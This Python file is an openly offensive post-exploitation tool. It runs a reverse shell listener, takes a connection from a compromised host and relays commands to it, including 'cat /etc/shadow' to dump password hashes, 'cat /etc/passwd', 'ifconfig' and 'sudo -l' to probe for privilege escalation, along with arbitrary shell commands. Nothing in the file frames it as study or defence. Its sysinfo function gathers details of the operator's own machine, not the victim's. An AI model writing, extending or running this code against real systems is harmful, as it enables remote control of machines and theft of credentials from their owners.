import os
import subprocess
import socket
import colorama
import platform
import getpass
import locale

colorama.init(autoreset=True)

class post_exploitationCommands:
    def __init__(self, RHOST, RPORT, conn):
        self.HOST = RHOST
        self.RPORT = RPORT
        self.conn = conn
    
    def print_help(self):
        help_text = """
        Available Commands:
        - sysinfo        : Get system information
        - dump hashes    : Dump password hashes
        - users          : List all users
        - network        : Show network information
        - privilege_check: Check for privilege escalation possibilities
        """
        self.conn.send(help_text.encode())

    def dump_hashes(self):
        self.conn.send(b'cat /etc/shadow')
        hash_dump = self.conn.recv(4096).decode()
        print('[+] Successfully Dumped All The Hashes:')
        print(hash_dump)

    def sysinfo(self):
        info = {
            "Computer": socket.gethostname(),
            "OS": f"{platform.system()} {platform.release()} ({platform.version()})",
            "Architecture": platform.machine(),
            "System Language": locale.getdefaultlocale()[0],
            "Domain": os.getenv("USERDOMAIN") or "N/A",
            "Logged On User": getpass.getuser(),
        }

        self.conn.send(b"[+] System Information:\n")
        for key, value in info.items():
            self.conn.send(f"{key:16}: {value}\n".encode())

    def users(self):
        # Linux example
        self.conn.send(b"cat /etc/passwd")
        user_list = self.conn.recv(4096).decode()
        print('[+] Successfully Fetched User List:')
        print(user_list)

    def network(self):
        # Show IP configuration and network connections
        self.conn.send(b"ifconfig")  # Use 'ipconfig' on Windows
        network_info = self.conn.recv(4096).decode()
        print('[+] Network Information:')
        print(network_info)

    def privilege_check(self):
        # Linux example: Check sudo permissions
        self.conn.send(b"sudo -l")
        sudo_permissions = self.conn.recv(4096).decode()
        if "not allowed" in sudo_permissions:
            print("[+] No sudo permissions.")
        else:
            print("[+] Sudo permissions granted. Possible privilege escalation.")


def run():
    print("\n===========================")
    print("   Post Exploitation Menu")
    print("===========================\n")
    print("[1] - Start Reverse Shell Listener")
    print("[2] - Exit")

    choice = input("post> ").strip()

    if choice == '1':
        LHOST = input("Enter your LHOST: ").strip()
        LPORT = input("Enter your LPORT: ").strip()

        # Ensure LPORT is an integer
        try:
            LPORT = int(LPORT)
        except ValueError:
            print("[!] Invalid port number.")
            return

        s = socket.socket()
        s.bind((LHOST, LPORT))
        s.listen(1)
        print(f"[+] Listening on {LHOST}:{LPORT}...")

        conn, addr = s.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")

        commands = post_exploitationCommands(addr[0], addr[1], conn)

        while True:
            command = input("shell> ").strip()

            if command.lower() in ['exit', 'quit']:
                conn.send(b'exit')
                print("[+] Closing connection...")
                break

            elif command.lower() == 'dump hashes':
                try:
                    print("[+] Dumping hashes...")
                    commands.dump_hashes()
                except Exception as e:
                    print(f"[!] Error dumping hashes: {e}")
                continue

            elif command.lower() == "sysinfo":
                try:
                    print("[+] Fetching system info...")
                    commands.sysinfo()
                except Exception as e:
                    print(f"[!] Error fetching system info: {e}")
                continue

            elif command.lower() == "users":
                try:
                    print("[+] Fetching user list...")
                    commands.users()
                except Exception as e:
                    print(f"[!] Error fetching users: {e}")
                continue

            elif command.lower() == "network":
                try:
                    print("[+] Fetching network information...")
                    commands.network()
                except Exception as e:
                    print(f"[!] Error fetching network information: {e}")
                continue

            elif command.lower() == "privilege_check":
                try:
                    print("[+] Checking for privilege escalation...")
                    commands.privilege_check()
                except Exception as e:
                    print(f"[!] Error checking privilege escalation: {e}")
                continue

            elif command.lower() == "help":
                try:
                    commands.print_help()
                except Exception as e:
                    print(f"[!] Error displaying help: {e}")
                continue

            elif command:
                try:
                    conn.send(command.encode())
                    data = conn.recv(4096).decode()
                    print(data)
                except Exception as e:
                    print(f"[!] Error executing command: {e}")
                continue

        conn.close()
        s.close()
        print("[+] Listener closed.")

    elif choice == '2':
        pass
